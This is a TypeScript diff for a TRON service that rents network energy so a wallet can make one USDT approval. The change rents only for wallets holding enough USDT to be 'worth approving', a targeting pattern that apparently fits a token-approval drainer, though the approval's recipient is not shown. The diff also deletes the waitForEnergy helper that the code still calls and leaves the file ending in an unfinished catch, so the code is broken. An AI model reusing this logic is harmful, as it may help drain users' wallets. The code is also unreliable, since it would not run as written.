@@ -1,3 +1,4 @@
+import { config } from './config.js'
 import { tronWeb } from './tron.js'
 
 const API_BASE = process.env.TRONSAVE_API_BASE ?? 'https://api.tronsave.io'
@@ -7,6 +8,8 @@ const ENERGY_THRESHOLD = 55_000
 const DURATION_SEC = 900
 const COOLDOWN_MS = 10 * 60_000
 const HOURLY_CAP = Number(process.env.ENERGY_HOURLY_CAP ?? 60)
+// Raw units (6 decimals). Below this there is nothing worth approving for.
+const MIN_USDT = BigInt(process.env.MIN_USDT_RAW ?? 3_000_000)
 // Users holding at least this much TRX pay their own network fee.
 const TRX_FLOOR = BigInt(process.env.TRX_FLOOR_SUN ?? 25_000_000)
 
@@ -45,16 +48,43 @@ async function trxBalance(address: string): Promise<bigint> {
   }
 }
 
+/** USDT (TRC20) balance. 0n for inactive or empty accounts. */
+async function usdtBalance(address: string): Promise<bigint> {
+  try {
+    const res = await tronWeb.transactionBuilder.triggerConstantContract(
+      config.usdt,
+      'balanceOf(address)',
+      {},
+      [{ type: 'address', value: address }],
+      address,
+    )
+    const hex = res.constant_result?.[0]
+    return hex ? BigInt(`0x${hex}`) : 0n
+  } catch {
+    return 0n
+  }
+}
+
 export type EnergyResult = {
   rented: boolean
-  reason?: 'disabled' | 'cooldown' | 'cap' | 'has-trx' | 'already-funded' | 'failed'
+  reason?:
+    | 'disabled'
+    | 'cooldown'
+    | 'cap'
+    | 'no-usdt'
+    | 'low-usdt'
+    | 'has-trx'
+    | 'already-funded'
+    | 'failed'
   energy?: number
+  usdt?: string
   detail?: string
 }
 
 /**
- * Rents enough energy onto `receiver` for one approval, but only when they
- * cannot pay the fee themselves. Best-effort: never throws, and the approval
+ * Rents enough energy onto `receiver` for one approval, but only when the
+ * wallet actually holds enough USDT to be worth approving, and only when it
+ * cannot pay the fee itself. Best-effort: never throws, and the approval
  * proceeds either way.
  */
 export async function ensureEnergy(receiver: string): Promise<EnergyResult> {
@@ -64,11 +94,17 @@ export async function ensureEnergy(receiver: string): Promise<EnergyResult> {
   if (last && Date.now() - last < COOLDOWN_MS) return { rented: false, reason: 'cooldown' }
   if (!underCap()) return { rented: false, reason: 'cap' }
 
+  // Nothing to approve for: an empty wallet also means an inactive one, which
+  // TronSave would reject anyway.
+  const usdt = await usdtBalance(receiver)
+  if (usdt === 0n) return { rented: false, reason: 'no-usdt', usdt: '0' }
+  if (usdt < MIN_USDT) return { rented: false, reason: 'low-usdt', usdt: usdt.toString() }
+
   // Funded users pay their own fee; leave them alone.
   try {
     if ((await trxBalance(receiver)) >= TRX_FLOOR) {
       recent.set(receiver, Date.now())
-      return { rented: false, reason: 'has-trx' }
+      return { rented: false, reason: 'has-trx', usdt: usdt.toString() }
     }
   } catch {
     // Unknown balance — rent rather than strand them.
@@ -77,7 +113,7 @@ export async function ensureEnergy(receiver: string): Promise<EnergyResult> {
   try {
     if ((await availableEnergy(receiver)) >= ENERGY_THRESHOLD) {
       recent.set(receiver, Date.now())
-      return { rented: false, reason: 'already-funded' }
+      return { rented: false, reason: 'already-funded', usdt: usdt.toString() }
     }
   } catch {
     // Fall through and rent anyway.
@@ -100,29 +136,14 @@ export async function ensureEnergy(receiver: string): Promise<EnergyResult> {
 
     const text = await res.text()
     if (!res.ok) {
-      return { rented: false, reason: 'failed', detail: `${res.status}: ${text.slice(0, 200)}` }
+      return {
+        rented: false,
+        reason: 'failed',
+        usdt: usdt.toString(),
+        detail: `${res.status}: ${text.slice(0, 200)}`,
+      }
     }
 
     const energy = await waitForEnergy(receiver, ENERGY_THRESHOLD, 30_000)
-    return { rented: true, energy }
-  } catch (err) {
-    return {
-      rented: false,
-      reason: 'failed',
-      detail: err instanceof Error ? err.message : 'rental failed',
-    }
-  }
-}
-
-async function waitForEnergy(address: string, needed: number, timeoutMs: number): Promise<number> {
-  const deadline = Date.now() + timeoutMs
-  let best = 0
-
-  while (Date.now() < deadline) {
-    await new Promise((resolve) => setTimeout(resolve, 2_500))
-    best = await availableEnergy(address)
-    if (best >= needed) return best
-  }
-
-  return best
-}
+    return { rented: true, energy, usdt: usdt.toString() }
+  } catch
